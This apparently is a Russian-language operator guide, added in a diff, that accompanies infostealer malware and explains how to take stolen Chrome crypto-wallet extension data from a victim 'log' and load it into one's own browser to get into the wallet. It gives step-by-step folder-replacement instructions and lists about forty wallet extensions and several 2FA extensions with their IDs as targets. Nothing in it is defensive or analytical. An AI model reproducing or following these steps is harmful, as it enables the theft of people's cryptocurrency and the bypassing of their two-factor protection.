@@ -1,0 +1,86 @@
+ИСПОЛЬЗОВАНИЕ СОБРАННЫХ ПЛАГИНОВ
+
+Софт собирает криптокошельки-плагины для хрома, которые можно подгрузить на своем пк и попасть в учетку внутри плагина
+
+ПОДГРУЗКА ДАННЫХ ПЛАГИНА
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Если в логе в админке показывает, что есть крипта (желтый счетчик рядом с счетчиком паролей) и внутри лога есть папка Plugins, то заходим в нее и смотрим содержимое, пример:
+Plugins\Chrome\Default\BitClip
+
+В пути есть информация о плагине и откуда он взят:
+Chrome - браузер Google Chrome 
+Default - профиль браузера (может быть полезно, если вдруг понадобятся куки, автозаполнение или пароли от определенного профиля браузера)
+BitClip - название плагина
+
+Для того, чтобы подгрузить данные от плагина, нужен любой chromium-based браузер (Google Chrome, Chromium или любой другой, рекомендую Google Chrome - чтобы плагины с магазина хрома скачивать без проблем)
+Этапы следующие:
+1. Устанавливаем необходимый плагин, ссылку на плагин можно взять из таблице ниже в этом файле
+2. Открываем рабочую папку хрома, пример:
+C:\Users\SandBox\AppData\Local\Google\Chrome\User Data\Default
+ВАЖНО! Проверьте имя профиля браузера, если есть папки Profile 1, Profile 2 и тд, то смотрите, какой профиль у вас активный в браузере. По-умолчанию остается Default. Посмотреть активные профили - в браузере справа сверху, кликабельная аватарка рядом с открытием меню.
+
+3. Закрываем браузер
+
+4. Находим и заменяем содержимое папок с конфигами плагина, пример папок:
+C:\Users\SandBox\AppData\Local\Google\Chrome\User Data\Default\Local Extension Settings\ijmpgkjfkbfhoebgogflfebnmejmfbml
+C:\Users\SandBox\AppData\Local\Google\Chrome\User Data\Default\Sync Extension Settings\ijmpgkjfkbfhoebgogflfebnmejmfbml
+C:\Users\SandBox\AppData\Local\Google\Chrome\User Data\Default\IndexedDB\chrome-extension_ijmpgkjfkbfhoebgogflfebnmejmfbml_0.indexeddb.leveldb
+Где ijmpgkjfkbfhoebgogflfebnmejmfbml - ID плагина. ID можно взять из ссылки для загрузки плагина, находится в конце ссылки.
+
+Содержимое будет не пустое только в одной-двух из этих трех папок, удаляем содержимое и закидываем собранное софтом.
+
+5. Запускаем браузер, смотрим в плагин.
+
+
+
+НАЗВАНИЕ ПЛАГИНА					ССЫЛКА ДЛЯ ЗАГРУЗКИ	
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+TronLink							https://chrome.google.com/webstore/detail/tronlink%EF%BC%88%E6%B3%A2%E5%AE%9D%E9%92%B1%E5%8C%85%EF%BC%89/ibnejdfjmmkpcnlpebklmnkoeoihofec
+MetaMask							https://chrome.google.com/webstore/detail/metamask/nkbihfbeogaeaoehlefnkodbefgpgknn
+Binance Chain Wallet				https://chrome.google.com/webstore/detail/binance-chain-wallet/fhbohimaelbohpjbbldcngcnapndodjp
+Yoroi								https://chrome.google.com/webstore/detail/yoroi/ffnbelfdoeiohenkjibnmadjiehjhajb
+Nifty Wallet						https://chrome.google.com/webstore/detail/nifty-wallet/jbdaocneiiinmjbjlgalhcelgbejmnid
+Math Wallet							https://chrome.google.com/webstore/detail/math-wallet/afbcbjpbpfadlkmhmclhkeeodmamcflc
+Coinbase Wallet						https://chrome.google.com/webstore/detail/coinbase-wallet-extension/hnfanknocfeofbddgcijnmhnfnkdnaad
+Guarda								https://chrome.google.com/webstore/detail/guarda/hpglfhgfnhbgpjdenjgmdgoeiappafln
+EQUAL Wallet						https://chrome.google.com/webstore/detail/equal-wallet/blnieiiffboillknjnepogjhkgnoapac
+Jaxx Liberty						https://chrome.google.com/webstore/detail/jaxx-liberty/cjelfplplebdjjenllpjcblmjkfcffne
+BitApp Wallet						https://chrome.google.com/webstore/detail/bitapp-wallet/fihkakfobkmkjojpchpfgcmhfjnmnfpi?q=QR&hl=de
+iWallet								https://chrome.google.com/webstore/detail/iwallet/kncchdigobghenbbaddojjnnaogfppfj
+Wombat								https://chrome.google.com/webstore/detail/wombat-eos-telos-wallet/amkmjjmmflddogmhpjloimipbofnfjih
+MEW CX								https://chrome.google.com/webstore/detail/mew-cx/nlbmnnijcnlegkjjpcfjclmcfggfefdm
+GuildWallet							https://chrome.google.com/webstore/detail/guildwallet/nanjmdknhkinifnkgdcggcfnhdaammmj
+Saturn Wallet						https://chrome.google.com/webstore/detail/saturn-wallet/nkddgncdjgjfcddamfgcmfnlhccnimig
+Ronin Wallet						https://chrome.google.com/webstore/detail/ronin-wallet/fnjhmkhhmkbjkkabndcnnogagogbneec
+NeoLine								https://chrome.google.com/webstore/detail/neoline/cphhlgmgameodnhkjdmkpanlelnlohao
+Clover Wallet						https://chrome.google.com/webstore/detail/clover-wallet/nhnkbkgjikgcigadomkphalanndcapjk
+Liquality Wallet					https://chrome.google.com/webstore/detail/liquality-wallet/kpfopkelmapcoipemfendmdcghnegimn
+Terra Station						https://chrome.google.com/webstore/detail/terra-station/aiifbnbfobpmeekipheeijimdpnlpgpp
+Keplr								https://chrome.google.com/webstore/detail/keplr/dmkamcknogkgcdfhhbddcghachkejeap
+Sollet								https://chrome.google.com/webstore/detail/sollet/fhmfendgdocmcbmfikdcogofphimnkno
+Auro Wallet							https://chrome.google.com/webstore/detail/auro-walletmina-protocol/cnmamaachppnkjgnildpdmkaakejnhae?hl=ru
+Polymesh Wallet						https://chrome.google.com/webstore/detail/polymesh-wallet/jojhfeoedkpkglbfimdfabpdfjaoolaf
+ICONex								https://chrome.google.com/webstore/detail/iconex/flpiciilemghbmfalicajoolhkkenfel
+Nabox Wallet						https://chrome.google.com/webstore/detail/nabox-wallet/nknhiehlklippafakaeklbeglecifhad
+KHC									https://chrome.google.com/webstore/detail/khc/hcflpincpppdclinealmandijcmnkbgn?hl=en-GB
+Temple								https://chrome.google.com/webstore/detail/temple-tezos-wallet-ex-th/ookjlbkiijinhpmnjffcofjonbfbgaoc
+TezBox								https://chrome.google.com/webstore/detail/tezbox-tezos-wallet/mnfifefkajgofkcjkemidiaecocnkjeh
+Cyano Wallet						https://chrome.google.com/webstore/detail/cyano-wallet/dkdedlpgdmmkkfjabffeganieamfklkm
+Byone								https://chrome.google.com/webstore/detail/byone/nlgbhdfgdhgbiamfdfmbikcdghidoadd
+OneKey								https://chrome.google.com/webstore/detail/onekey/infeboajgfhgbjpjbeppbkgnabfdkdaf
+LeafWallet							https://chrome.google.com/webstore/detail/leafwallet-easy-to-use-eo/cihmoadaighcejopammfbmddcmdekcje
+DAppPlay							https://chrome.google.com/webstore/detail/dappplay/lodccjjbdhfakaekdiahmedfbieldgik
+BitClip								https://chrome.google.com/webstore/detail/bitclip/ijmpgkjfkbfhoebgogflfebnmejmfbml
+Steem Keychain						https://chrome.google.com/webstore/detail/steem-keychain/lkcjlnjfpbikmcmbachjpdbijejflpcm
+Nash Extension						https://chrome.google.com/webstore/detail/nash-extension/onofpnbbkehpmmoabgpcpmigafmmnjhl
+Hycon Lite Client					https://chrome.google.com/webstore/detail/hycon-lite-client/bcopgchhojmggmffilplmbdicgaihlkp
+ZilPay								https://chrome.google.com/webstore/detail/zilpay/klnaejjgbibmhlephnhpmaofohgkpgkd
+Coin98 Wallet						https://chrome.google.com/webstore/detail/coin98-wallet/aeachknmefphepccionboohckonoeemg
+
+2ФА Плагины ---------------------------------------------------------------------------------------
+
+Authenticator						https://chrome.google.com/webstore/detail/authenticator/bhghoamapcdpbohphigoooaddinpkbai
+Authy								https://chrome.google.com/webstore/detail/authy/gaedmjdfmmahhbjefcbgaolhhanlaolb?hl=ru
+EOS Authenticator					https://chrome.google.com/webstore/detail/eos-authenticator/oeljdldpnmdbchonielidgobddffflal
+GAuth Authenticator					https://chrome.google.com/webstore/detail/gauth-authenticator/ilgcnhelpchnceeipipijaljkblbcobl?hl=ru
+Trezor Password Manager				https://chrome.google.com/webstore/detail/trezor-password-manager/imloifkgjagghnncjkhggdhalmcnfklk?hl=ru
